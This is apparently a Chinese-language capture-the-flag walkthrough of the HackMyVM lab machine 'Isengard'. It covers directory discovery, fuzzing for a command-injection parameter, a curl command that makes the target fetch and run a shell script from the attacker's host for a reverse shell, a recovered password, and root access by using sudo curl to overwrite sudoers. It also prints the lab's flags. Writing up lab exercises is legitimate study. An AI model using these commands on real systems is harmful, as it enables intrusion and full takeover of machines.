# Isengard

2025.01.01 https://hackmyvm.eu/machines/machine.php?vm=Isengard

## Ip

192.168.5.21

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

80 web 扫描目录没什么隐藏目录，查看 html 源码，在 main.css 文件最底部发现隐藏信息：

```
http://192.168.5.21/main.css

/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */
```

访问 http://192.168.5.21/y0ush4lln0tp4ss 查看其源码，发现有注释信息，但是图片没有隐写信息：

```
<!-- <img src="2.jpg" /> -->
```

对目录/y0ush4lln0tp4ss 进行扫描，扫描出一个目录 http://192.168.5.21/y0ush4lln0tp4ss/east/ 查看其源码，发现 ring.zip ，下载 http://192.168.5.21/y0ush4lln0tp4ss/east/ring.zip 下载后将其解压，发现最终里面有个 password 文件，但是没看出什么信息。

继续对 east 目录进行扫描，又扫描出一个 http://192.168.5.21/y0ush4lln0tp4ss/east/mellon.php 访问后什么都没有，应该是有隐藏参数，可能存在文件包含或者是 RCE，使用 ffuf 进行探测：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://192.168.5.21/y0ush4lln0tp4ss/east/mellon.php?FUZZ=ls
```

找到参数 frodo 可以执行命令，直接 kali 建立监听，然后反弹 shell：

```
curl -G --data-urlencode 'frodo=wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://192.168.5.21/y0ush4lln0tp4ss/east/mellon.php
```

得到反弹的 shell 后，在当前目录下，发现:

```
www-data@isengard:/var/www/html/y0ush4lln0tp4ss/east$ cat oooREADMEooo
it is not easy to find the unique ring
keep searching
```

提示继续寻找 ring 文件，发现另一个 ring.zip ： /opt/.nothingtoseehere/.donotcontinue/.stop/.heWillKnowYouHaveIt/.willNotStop/.ok_butDestroyIt/ring.zip 解压后获的内容：

```
www-data@isengard:/tmp$ cat  ring.txt
ZVZoTFRYYzFkM0JUUVhKTU1rTk1XQW89Cg==
```

两次 base64 解码后，得到 yXKMw5wpSArL2CLX 看样子像是个密码，尝试切换到用户 sauron，切换成功。

得到了 user flag：

```
sauron@isengard:~$ cat user.txt
HMV{Y0uc4nN0tp4sS}
```

sudo -l 发现提权点：

```
(ALL) /usr/bin/curl
```

直接将 sudoers 配置文件下载到：

```
echo 'sauron ALL=(ALL:ALL) NOPASSWD: ALL' > /tmp/tt
sudo curl file:///tmp/tt -o /etc/sudoers.d/tt
```

最终得到了 root flag：

```
sudo su root
root@isengard:~# cat root.txt
HMV{Y0uD3stR0y3dTh3r1nG}
```
